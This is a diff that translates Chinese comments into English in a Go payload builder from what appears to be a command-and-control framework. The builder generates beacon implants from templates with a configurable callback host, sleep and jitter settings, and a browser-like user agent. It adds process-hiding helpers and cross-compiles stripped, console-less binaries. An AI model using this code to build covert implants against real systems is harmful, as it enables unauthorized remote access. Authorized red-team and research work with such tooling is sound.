@@ -1,4 +1,4 @@
-﻿package c2
+package c2
 
 import (
 	"encoding/json"
@@ -15,7 +15,7 @@ import (
 	"go.uber.org/zap"
 )
 
-// PayloadBuilderInput 构建 beacon 的输入参数
+// PayloadBuilderInput holds the input parameters for building a beacon.
 type PayloadBuilderInput struct {
 	ListenerID    string // l_xxx
 	OS            string // linux|windows|darwin
@@ -23,19 +23,19 @@ type PayloadBuilderInput struct {
 	SleepSeconds  int
 	JitterPercent int
 	OutputName    string // custom output filename (without extension); defaults to "beacon_<os>_<arch>"
-	// Host 非空时作为植入端回连地址（覆盖监听器的 bind_host / 0.0.0.0 自动探测）
+	// Host: when non-empty, is used as the implant callback address (overrides listener bind_host / 0.0.0.0 auto-detection)
 	Host string
 }
 
-// PayloadBuilder 负责从模板生成并交叉编译 beacon 二进制
+// PayloadBuilder is responsible for generating and cross-compiling a beacon binary from templates.
 type PayloadBuilder struct {
 	manager   *Manager
 	logger    *zap.Logger
-	tmplDir   string // 模板目录，如 internal/c2/payload_templates
-	outputDir string // 输出目录，如 tmp/c2/payloads
+	tmplDir   string // template directory, e.g. internal/c2/payload_templates
+	outputDir string // output directory, e.g. tmp/c2/payloads
 }
 
-// NewPayloadBuilder 创建构建器
+// NewPayloadBuilder creates a new builder.
 func NewPayloadBuilder(manager *Manager, logger *zap.Logger, tmplDir, outputDir string) *PayloadBuilder {
 	if tmplDir == "" {
 		tmplDir = "internal/c2/payload_templates"
@@ -51,18 +51,18 @@ func NewPayloadBuilder(manager *Manager, logger *zap.Logger, tmplDir, outputDir 
 	}
 }
 
-// BuildResult 构建结果
+// BuildResult holds the build output.
 type BuildResult struct {
 	PayloadID    string `json:"payload_id"`
 	ListenerID   string `json:"listener_id"`
 	OutputPath   string `json:"output_path"`
-	DownloadPath string `json:"download_path"` // 磁盘上的绝对路径
+	DownloadPath string `json:"download_path"` // absolute path on disk
 	OS           string `json:"os"`
 	Arch         string `json:"arch"`
 	SizeBytes    int64  `json:"size_bytes"`
 }
 
-// BuildBeacon 交叉编译生成 beacon 二进制
+// BuildBeacon cross-compiles and generates a beacon binary.
 func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, error) {
 	listener, err := b.manager.DB().GetC2Listener(in.ListenerID)
 	if err != nil {
@@ -80,7 +80,7 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 	}
 	cfg.ApplyDefaults()
 
-	// 确定目标架构
+	// Validate target architecture
 	goos := strings.ToLower(in.OS)
 	goarch := strings.ToLower(in.Arch)
 	if goos == "" {
@@ -90,13 +90,13 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 		goarch = "amd64"
 	}
 
-	// 模板参数：请求 Host > 监听器 callback_host > bind 推导（见 ResolveBeaconDialHost）
+	// Template parameter: request Host > listener callback_host > bind derivation (see ResolveBeaconDialHost)
 	host := ResolveBeaconDialHost(listener, in.Host, b.logger, listener.ID)
 	if err := ValidateBeaconDialHost(host); err != nil {
 		return nil, err
 	}
 
-	// 读取模板
+	// Read template
 	tmplPath := filepath.Join(b.tmplDir, "beacon.go.tmpl")
 	tmplData, err := os.ReadFile(tmplPath)
 	if err != nil {
@@ -139,18 +139,18 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 		"UserAgent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
 	}
 
-	// 执行模板
+	// Execute template
 	tmpl, err := template.New("beacon").Parse(string(tmplData))
 	if err != nil {
 		return nil, fmt.Errorf("parse template: %w", err)
 	}
 
-	// 创建工作目录
+	// createworking directory
 	workDir := filepath.Join(b.outputDir, "build-"+uuid.New().String()[:8])
 	if err := os.MkdirAll(workDir, 0755); err != nil {
 		return nil, fmt.Errorf("mkdir: %w", err)
 	}
-	defer os.RemoveAll(workDir) // 清理
+	defer os.RemoveAll(workDir) // cleanup
 
 	srcPath := filepath.Join(workDir, "main.go")
 	f, err := os.Create(srcPath)
@@ -163,7 +163,7 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 	}
 	f.Close()
 
-	// 平台相关辅助源文件（如无窗口子进程）
+	// Platform-specific helper source files (e.g. no-console-window child process)
 	for _, name := range []string{"proc_hide_windows.go", "proc_hide_unix.go"} {
 		helperSrc := filepath.Join(b.tmplDir, name+".tmpl")
 		helperData, readErr := os.ReadFile(helperSrc)
@@ -175,7 +175,7 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 		}
 	}
 
-	// 交叉编译
+	// Cross-compile
 	payloadID := "p_" + strings.ReplaceAll(uuid.New().String(), "-", "")[:14]
 	binName := strings.TrimSpace(in.OutputName)
 	if binName == "" {
@@ -196,7 +196,7 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 	}
 	ldflags := "-s -w -buildid="
 	if goos == "windows" {
-		// 无控制台窗口运行 beacon 本体
+		// Run the beacon body without a console window
 		ldflags += " -H windowsgui"
 	}
 	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-trimpath", "-o", absBinPath, ".")
@@ -212,7 +212,7 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 		return nil, fmt.Errorf("build failed: %w (output: %s)", err, string(output))
 	}
 
-	// 获取文件大小
+	// Get file size
 	info, err := os.Stat(binPath)
 	if err != nil {
 		return nil, fmt.Errorf("stat output: %w", err)
@@ -261,13 +261,13 @@ func clamp(v, min, max int) int {
 	return v
 }
 
-// GetPayloadStoragePath 返回 payload 存储目录的绝对路径
+// GetPayloadStoragePath returns the absolute path of the payload storage directory.
 func (b *PayloadBuilder) GetPayloadStoragePath() string {
 	abs, _ := filepath.Abs(b.outputDir)
 	return abs
 }
 
-// GetSupportedOSArch 返回支持的操作系统和架构列表
+// GetSupportedOSArch returns the list of supported operating systems and architectures.
 func GetSupportedOSArch() map[string][]string {
 	return map[string][]string{
 		"linux":   {"amd64", "arm64", "386", "arm"},
@@ -276,7 +276,7 @@ func GetSupportedOSArch() map[string][]string {
 	}
 }
 
-// ValidateOSArch 验证 OS/Arch 组合是否可编译
+// ValidateOSArch validates whether the OS/Arch combination can be compiled.
 func ValidateOSArch(os, arch string) bool {
 	supported := GetSupportedOSArch()
 	arches, ok := supported[strings.ToLower(os)]
